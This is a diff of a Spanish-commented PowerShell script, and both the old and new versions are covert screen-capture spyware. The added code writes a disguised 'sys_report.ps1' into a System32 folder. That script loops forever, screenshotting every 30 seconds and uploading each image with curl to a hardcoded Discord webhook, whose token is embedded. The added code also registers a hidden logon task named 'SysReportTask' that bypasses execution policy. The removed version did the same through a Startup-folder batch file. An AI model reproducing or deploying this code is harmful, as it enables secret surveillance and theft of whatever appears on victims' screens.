@@ -1,46 +1,59 @@
-# Función para capturar y enviar la captura de pantalla al webhook
-function CaptureAndSendScreenshot {
-    # Definir la URL del webhook
-    $webhookUrl = "https://discord.com/api/webhooks/1203343432970539008/JjFQGyK8MZw2qySfc4jYTPw0jzsH2HKaKAaaQ27uyrllfMIVaDqEUi_ZywclJBmWpxJp"
+# Definir la URL del webhook de Discord
+$hookurl = "https://discord.com/api/webhooks/1203343432970539008/JjFQGyK8MZw2qySfc4jYTPw0jzsH2HKaKAaaQ27uyrllfMIVaDqEUi_ZywclJBmWpxJp"  # Reemplaza "URL_DEL_WEBHOOK" con la URL de tu webhook de Discord
 
-    # Definir la archivo temporal de la captura de pantalla
-    $screenshotFile = "$env:TEMP\SC.png"
+# Definir el nombre del directorio y el script
+$directoryName = "C:\Windows\System32\Scripts"
+$scriptName = "sys_report.ps1"
 
-    # Capturar la pantalla y guardarla en el archivo temporal
-    Add-Type -AssemblyName System.Windows.Forms
-    Add-Type -AssemblyName System.Drawing
-    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-    $width = $screen.Width
-    $height = $screen.Height
-    $left = $screen.Left
-    $top = $screen.Top
-    $bitmap = New-Object System.Drawing.Bitmap $width, $height
-    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-    $graphic.CopyFromScreen($left, $top, 0, 0, $bitmap.Size)
-    $bitmap.Save($screenshotFile, [System.Drawing.Imaging.ImageFormat]::Png)
-
-    # Verificar si el archivo de captura de pantalla se creó exitosamente y tiene contenido
-    if ((Test-Path $screenshotFile) -and (Get-Item $screenshotFile).length -gt 0) {
-        try {
-            # Envío de la captura de pantalla al webhook
-            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data" -InFile $screenshotFile -ErrorAction Stop
-        } catch {
-            Write-Host "Ocurrió un error al intentar enviar la captura de pantalla al webhook: $_"
-        }
-    } else {
-        Write-Host "La captura de pantalla no se realizó correctamente o el archivo está vacío. No se pudo enviar al webhook."
-    }
+# Crear el directorio si no existe
+if (-not (Test-Path -Path $directoryName)) {
+    New-Item -Path $directoryName -ItemType Directory | Out-Null
 }
 
-# Ejecutar la función de captura de pantalla una vez
-CaptureAndSendScreenshot
+# Definir el contenido del script
+$scriptContent = @"
+`$hookurl = "$hookurl"
+`$seconds = 30 # Intervalo de captura de pantalla en segundos
+`$a = 0 # Contador de capturas de pantalla
 
-# Crear un archivo por lotes (batch) para ejecutar el script en segundo plano
-$batchScriptPath = "$env:TEMP\RunInvisible.bat"
-$batchScriptContent = "@echo off`npowershell.exe -WindowStyle Hidden -File `"$PSCommandPath`""
-$batchScriptContent | Out-File -FilePath $batchScriptPath -Encoding ASCII
+# Bucle infinito para tomar capturas de pantalla continuamente
+while (`$true) {
+    `$a++
+    `$Filett = "$env:temp\SC_$a.png"  # Ruta del archivo de la captura de pantalla
+    
+    # Obtiene las dimensiones de la pantalla virtual
+    `$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+    `$Width = `$Screen.Width
+    `$Height = `$Screen.Height
+    `$Left = `$Screen.Left
+    `$Top = `$Screen.Top
+    
+    # Crea un objeto Bitmap y copia la pantalla en él
+    `$bitmap = New-Object System.Drawing.Bitmap `$Width, `$Height
+    `$graphic = [System.Drawing.Graphics]::FromImage(`$bitmap)
+    `$graphic.CopyFromScreen(`$Left, `$Top, 0, 0, `$bitmap.Size)
+    
+    # Guarda la captura de pantalla como un archivo PNG
+    `$bitmap.Save(`$Filett, [System.Drawing.Imaging.ImageFormat]::png)
+    
+    # Envía la captura de pantalla al webhook de Discord
+    curl.exe -F "file1=@`$Filett" `$hookurl
+    
+    # Elimina el archivo de la captura de pantalla
+    Remove-Item -Path `$Filett
+    
+    # Espera el intervalo de tiempo especificado antes de tomar otra captura de pantalla
+    Start-Sleep -Seconds `$seconds
+}
+"@
 
-# Copiar el archivo por lotes a la carpeta de inicio de Windows
-$startupFolder = [Environment]::GetFolderPath("Startup")
-$batchScriptDestination = Join-Path -Path $startupFolder -ChildPath "RunInvisible.bat"
-Copy-Item -Path $batchScriptPath -Destination $batchScriptDestination -Force
+# Guardar el script en el archivo
+$scriptPath = Join-Path -Path $directoryName -ChildPath $scriptName
+$scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8 -Force
+
+# Configurar la tarea programada para ejecutar el script al iniciar sesión del usuario
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
+$trigger = New-ScheduledTaskTrigger -AtLogon
+$task = New-ScheduledTask -Action $action -Trigger $trigger -Description "Tarea programada para ejecutar el script de captura de pantalla de manera oculta al iniciar sesión del usuario" -TaskName "SysReportTask"
+Register-ScheduledTask -InputObject $task -Force | Out-Null
+Enable-ScheduledTask -TaskName "SysReportTask" | Out-Null
